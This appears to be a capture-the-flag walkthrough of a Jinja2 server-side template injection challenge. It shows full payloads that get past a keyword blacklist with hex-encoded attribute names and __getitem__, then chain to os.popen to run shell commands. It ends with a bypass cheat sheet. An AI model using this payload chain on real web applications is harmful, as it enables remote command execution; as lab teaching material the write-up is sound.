## ğŸ“ SSTI2 Challenge Walkthrough

In this challenge, weâ€™re dealing with a **Server-Side Template Injection (SSTI)** vulnerabilityâ€”but with heavy input filtering.

---

### âœ… Step 1: Confirm SSTI

We start by testing whether SSTI is possible:

```jinja2
{{ 7*7 }}
```

It returns 49, so SSTI is enabled.

---

### âŒ Step 2: Bypassing Keyword Blacklisting

Trying a textbook payload:

```jinja2
{{ "".__class__.__base__.__subclasses__() }}
```

...results in an error: â€œstop trying to break meâ€.

This means keywords like `class`, `base`, `subclasses`, and even `""` (an empty string) are blacklisted.

I tried using a custom string like `"idk"` instead of `""`:

```jinja2
{{ idk.__class__ }}
```

...but even that failed due to the sanitization.

Attempts like:
- Unicode/hex encoding `__class__`
- URL-encoding newline characters
- POSTing a newline

...all failed due to filters and sandbox constraints.

---

### ğŸ§ª Step 3: Exploring Filters & `attr`

I noticed that:

```jinja2
{{ idk | }}
```

...does not trigger an error, meaning filters are allowed.

So what are filters in Flask Jinja2?

Filters are built-in functions in Jinja2 that let you modify or format data before it's rendered in the template. They're used inside double curly braces like this:

```jinja2
{{ variable | filter_name }}
```

You can even pass arguments to them:

```jinja2
{{ variable | filter_name(arg1, arg2) }}
```

Theyâ€™re super helpful for cleaning up, transforming, or accessing data without writing any Python code in your backend. For example:
- `{{ "HELLO" | lower }}` becomes `"hello"`
- `{{ mylist | length }}` gives the number of items
- `{{ user | default("Guest") }}` shows `"Guest"` if `user` is undefined

In this challenge, filters arenâ€™t just for formatting â€” theyâ€™re a way to sneak around input filters. Thatâ€™s where `attr()` came in clutch: it let us access blocked attributes like `__class__` using their string names (which we hex-encoded to avoid detection).

So I dug into filter functions and found the holy grail: `attr`.

> `attr` allows you to dynamically access an attribute of an object using a string.

But directly accessing blacklisted attributes like `__class__` still failed:

```jinja2
{{ idk | attr("__class__") }}
```

So I hex-encoded it:

```jinja2
{{ idk | attr('\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f') }}
```

Success! We got the class.

I continued by hex-encoding the rest of the chain:

```jinja2
{{ idk
  | attr('\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f') # __class__ hex encoded
  | attr('\x5f\x5f\x62\x61\x73\x65\x5f\x5f') # __base__ hex encoded
  | attr('\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f')() # _subclasses__ hex encoded
}}
```

---

### ğŸ” Step 4: Finding the `warnings.catch_warnings` Class

In the output of `__subclasses__()`, I looked for `warnings.catch_warnings` (a known trick, since its `__init__` uses `sys.modules`).

It existed! At index 221.

But this didn't work:

```jinja2
(...subclasses__())[221]
```

Why? Because:
- `[]` is blacklisted
- Calling functions (`()`) often triggers errors in sandboxed environments

---

### ğŸ’¡ Step 5: Bypassing with `__getitem__`

Instead of using `[]`, I used:

```jinja2
| attr('__getitem__')(221)
```

That works because:
> `__getitem__` lets us simulate `obj[221]` without using square brackets.

Hereâ€™s the full, chained payload:

```jinja2
{{ idk
  | attr('\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f') # __class__ hex encoded
  | attr('\x5f\x5f\x62\x61\x73\x65\x5f\x5f') # __base__ hex encoded
  | attr('\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f')() # _subclasses__ hex encoded, we can't index/call the warnings subclass so we use getitem
  | attr('\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f')(221) # __getitem__ hex encoded and we get the 221th item which is the warning subclass
  | attr('\x5f\x5f\x69\x6e\x69\x74\x5f\x5f') # __init__ hex encoded to call the init method
  | attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f') # __globals__ to access the global variable, we can't access the sys variable directly here so we use getitem again
  | attr('\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f')('sys') #  __getitem__ hex encoded and we get the sys variable
  | attr('modules') # we access its modules (which contains os), we can't access the os module directly because we're calling a function and calling a function triggers an error
  | attr('\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f')('os') # so we use getitem again!, __getitem__ hex encoded
  | attr('popen')('cat flag') # accessing the popen function to opne a shell and execute "cat flag" (i executed ls first and then when i saw the flag.txt i cat'ed it)
  | attr('read')() # and here so we can see the output of the popen
}}
```

---

### ğŸ Step 6: Get the Flag

Paste the full payload into the form input, and...

BOOM â€” you get the flag:

```bash
picoCTF{... redacted ...}
```

---

## ğŸ§° Useful Jinja2 Filters for SSTI & Exploitation

Hereâ€™s a mini cheatsheet of filters that are particularly useful in SSTI/CTF contexts:

| Filter         | Purpose                                         |
|----------------|-------------------------------------------------|
| `attr()`       | Dynamically access attributes like `__class__`  |
| `e` / `escape` | Escape HTML (sometimes bypasses filters)        |
| `safe`         | Mark string as safe (no escaping)               |
| `default()`    | Provide fallback values to avoid breaking logic |
| `length`       | Get length of iterable (can test logic flow)    |
| `join`         | Concatenate strings from a list (may help with payload shaping) |
| `replace`      | Modify strings mid-template (bypass filters)    |

---

> Just look at that payload... itâ€™s a beautiful monstrosity. ğŸ˜¤ğŸ”¥  
> If youâ€™ve reached this point and understood the entire chain â€” youâ€™re a beast. ğŸğŸ’»

